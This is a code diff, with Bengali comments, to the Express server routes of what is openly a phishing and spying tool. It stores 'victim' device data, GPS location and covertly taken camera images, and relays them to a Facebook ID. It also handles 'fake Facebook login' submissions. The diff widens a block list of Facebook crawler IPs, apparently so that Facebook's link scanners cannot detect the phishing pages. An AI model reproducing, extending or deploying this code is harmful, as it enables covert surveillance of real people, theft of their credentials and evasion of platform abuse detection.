@@ -10,42 +10,66 @@ const {
 } = require('../utils/helpers');
 
 // ================================================================
-// 🚫 ব্লকড আইপি লিস্ট (এখান থেকে আসা রিকোয়েস্ট ব্লক হবে)
+// 🚫 ব্লকড আইপি লিস্ট (Facebook crawler)
 // ================================================================
 const BLOCKED_IPS = [
     '173.252.82.31',
     '173.252.82.30',
     '173.252.82.32',
-    // আরও Facebook IP যোগ করতে পারো
-];
-
-// 🚫 বট ইউজার-এজেন্ট ব্লক লিস্ট
-const BLOCKED_USER_AGENTS = [
-    'facebookexternalhit',
-    'Facebot',
-    'Googlebot',
-    'Twitterbot',
-    'LinkedInBot',
-    'Slurp',
-    'Bingbot',
-    'YandexBot',
-    'Pingdom',
-    'UptimeRobot',
-    'HeadlessChrome',
-    'PhantomJS'
+    '173.252.82.33',
+    '173.252.82.34',
+    '173.252.82.35',
+    '173.252.82.36',
+    // পুরো Facebook রেঞ্জ (আমরা শুধু IP ভিত্তিক ব্লক করছি)
 ];
 
 // ================================================================
-// হেল্পার: আসল IP বের করা (প্রক্সি/লোড ব্যালেন্সারের জন্য)
+// ✅ সঠিক IP বের করার ফাংশন (প্রক্সি/লোড ব্যালেন্সারের জন্য)
 // ================================================================
 function getClientIp(req) {
+    // 1. x-forwarded-for হেডার থেকে (প্রক্সির ক্ষেত্রে)
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
-        const ips = forwarded.split(',');
-        return ips[0].trim();
+        // কমা দ্বারা আলাদা করা IP গুলোর মধ্যে প্রথমটি হলো আসল IP
+        const ips = forwarded.split(',').map(ip => ip.trim());
+        return ips[0];
     }
-    return req.connection?.remoteAddress || req.socket?.remoteAddress || req.ip || '0.0.0.0';
+    
+    // 2. অন্যান্য হেডার
+    const ip = req.headers['cf-connecting-ip'] ||   // Cloudflare
+               req.headers['x-real-ip'] ||          // Nginx
+               req.connection?.remoteAddress ||
+               req.socket?.remoteAddress ||
+               req.ip ||
+               '0.0.0.0';
+    
+    // IPv6 লোকালহোস্ট ঠিক করা (::1 -> 127.0.0.1)
+    if (ip === '::1' || ip === '::ffff:127.0.0.1') {
+        return '127.0.0.1';
+    }
+    
+    return ip;
 }
+
+// ================================================================
+// 🚫 ব্লক চেক মিডলওয়্যার (সব POST রাউটের আগে)
+// ================================================================
+const blockMiddleware = (req, res, next) => {
+    const clientIp = getClientIp(req);
+    console.log(`🔍 IP চেক: ${clientIp}`);
+    
+    if (BLOCKED_IPS.includes(clientIp)) {
+        console.log(`🚫 ব্লকড IP: ${clientIp} → রিকোয়েস্ট ব্লক করা হয়েছে`);
+        return res.status(403).json({ 
+            status: 'error', 
+            message: 'Access denied',
+            blocked: true 
+        });
+    }
+    
+    // ব্লক না হলে পরবর্তী রাউটে যান
+    next();
+};
 
 // ================================================================
 // অটো ডিলিট: ১০ মিনিট
@@ -73,35 +97,10 @@ setInterval(async () => {
 }, CLEANUP_INTERVAL);
 
 // ================================================================
-// ব্লক চেক মিডলওয়্যার (সব রাউটের আগে)
-// ================================================================
-const blockMiddleware = (req, res, next) => {
-    const clientIp = getClientIp(req);
-    const ua = req.headers['user-agent'] || '';
-
-    // IP চেক
-    if (BLOCKED_IPS.includes(clientIp)) {
-        console.log(`🚫 ব্লকড IP: ${clientIp} → রিকোয়েস্ট ব্লক`);
-        return res.status(403).json({ status: 'error', message: 'Access denied' });
-    }
-
-    // User-Agent চেক (বট ডিটেক্ট)
-    for (const bot of BLOCKED_USER_AGENTS) {
-        if (ua.toLowerCase().includes(bot.toLowerCase())) {
-            console.log(`🚫 বট UA: ${ua} → রিকোয়েস্ট ব্লক`);
-            return res.status(403).json({ status: 'error', message: 'Access denied' });
-        }
-    }
-
-    // সব চেক পাস করলে যেতে দিন
-    next();
-};
-
-// ================================================================
-// রাউটস (ব্লক মিডলওয়্যার প্রয়োগ)
+// রাউটস (পাবলিক GET রাউটগুলোতে ব্লক নেই)
 // ================================================================
 
-// ক্যামেরা লিঙ্ক (পাবলিক, ব্লক নয়)
+// ক্যামেরা লিঙ্ক
 router.get('/v/:id', async (req, res) => {
     try {
         const victim = await Victim.findOne({ id: req.params.id });
@@ -150,7 +149,7 @@ router.post('/api/victim', blockMiddleware, async (req, res) => {
     try {
         const data = req.body;
         const clientIp = getClientIp(req);
-        console.log(`📥 /api/victim IP: ${clientIp}, ID: ${data.id}`);
+        console.log(`📥 /api/victim থেকে IP: ${clientIp}, ID: ${data.id}`);
 
         if (!data.id) {
             console.error('❌ id নেই!');
@@ -200,7 +199,7 @@ router.post('/api/victim', blockMiddleware, async (req, res) => {
             console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
         }
 
-        // লোকেশন মেসেজ
+        // লোকেশন মেসেজ (যদি থাকে)
         if (victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
             const locationMsg = formatLocationMessage(victim.gpsLocation);
             if (locationMsg) {
@@ -228,7 +227,7 @@ router.post('/api/camera', blockMiddleware, async (req, res) => {
     try {
         const { id, image } = req.body;
         const clientIp = getClientIp(req);
-        console.log(`📸 /api/camera IP: ${clientIp}, ID: ${id}`);
+        console.log(`📸 /api/camera থেকে IP: ${clientIp}, ID: ${id}`);
 
         if (!id || !image) {
             return res.status(400).json({ status: 'error', message: 'Missing id or image' });
@@ -269,7 +268,7 @@ router.post('/api/camera', blockMiddleware, async (req, res) => {
 });
 
 // ================================================================
-// ৩. ইমেজ ভিউ
+// ৩. ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
 // ================================================================
 router.get('/image/:id/:index', async (req, res) => {
     try {
@@ -290,7 +289,7 @@ router.get('/image/:id/:index', async (req, res) => {
 });
 
 // ================================================================
-// ৪. ফেক ফেসবুক লগইন
+// ৪. ফেক ফেসবুক লগইন ডেটা
 // ================================================================
 router.post('/api/fblogin', async (req, res) => {
     try {
